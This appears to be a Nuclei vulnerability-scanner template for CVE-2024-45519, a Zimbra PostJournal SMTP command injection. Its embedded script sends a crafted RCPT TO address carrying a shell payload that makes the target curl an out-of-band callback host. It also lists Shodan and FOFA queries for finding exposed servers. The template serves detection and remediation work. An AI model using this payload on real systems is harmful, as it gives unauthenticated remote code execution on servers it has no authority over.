id: CVE-2024-45519
info:
  author: pdresearch,iamnoooob,parthmalhotra,ice3man543
  classification:
    cpe: cpe:2.3:a:synacor:zimbra_collaboration_suite:*:*:*:*:*:*:*:*
    epss-percentile: 0.99904
    epss-score: 0.94112
  description: 'SMTP-based vulnerability in the PostJournal service of Zimbra Collaboration
    Suite that allows unauthenticated attackers to inject arbitrary commands. This
    vulnerability arises due to improper sanitization of SMTP input, enabling attackers
    to craft malicious SMTP messages that execute commands under the Zimbra user context.
    Successful exploitation can lead to unauthorized access, privilege escalation,
    and potential compromise of the affected system''s integrity and confidentiality.

    '
  impact: 'Unauthenticated attackers can inject arbitrary operating system commands
    through the PostJournal SMTP service, achieving remote code execution under the
    Zimbra user context.

    '
  metadata:
    fofa-query:
    - title="zimbra web client sign in"
    - title="zimbra collaboration suite"
    product: zimbra_collaboration_suite
    shodan-query:
    - http.title:"zimbra collaboration suite"
    - http.title:"zimbra web client sign in"
    - http.favicon.hash:1624375939
    vendor: synacor
  name: Zimbra Collaboration Suite < 9.0.0 - Remote Code Execution
  reference:
  - https://wiki.zimbra.com/wiki/Zimbra_Security_Advisories
  - https://blog.projectdiscovery.io/zimbra-remote-code-execution/
  remediation: 'Upgrade Zimbra Collaboration Suite to version 9.0.0 or later that
    properly sanitizes SMTP input.

    '
  severity: critical
  tags: js,cve,cve2024,smtp,rce,zimbra,kev,vkev,vuln
javascript:
- args:
    Host: '{{Host}}'
    Port: 25
    oast: '{{interactsh-url}}'
  code: 'let m = require(''nuclei/net'');

    let address = Host+":"+Port;

    let conn;

    conn=  m.Open(''tcp'', address)

    conn.Send(''EHLO localhost\r\n'');

    conn.RecvString()

    conn.Send(''MAIL FROM: <aaaa@mail.domain.com>\r\n'');

    conn.RecvString()

    conn.Send(''RCPT TO: <"aabbb$(curl${IFS}''+oast+'')"@mail.domain.com>\r\n'');

    conn.RecvString()

    conn.Send(''DATA\r\n'');

    conn.RecvString()

    conn.Send(''aaa\r\n'');

    conn.RecvString()

    conn.Send(''.\r\n'');

    resp = conn.RecvString()

    conn.Send(''QUIT\r\n'');

    conn.Close()

    resp

    '
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - type: word
    words:
    - message delivered
  matchers-condition: and
  pre-condition: 'isPortOpen(Host,Port);

    '
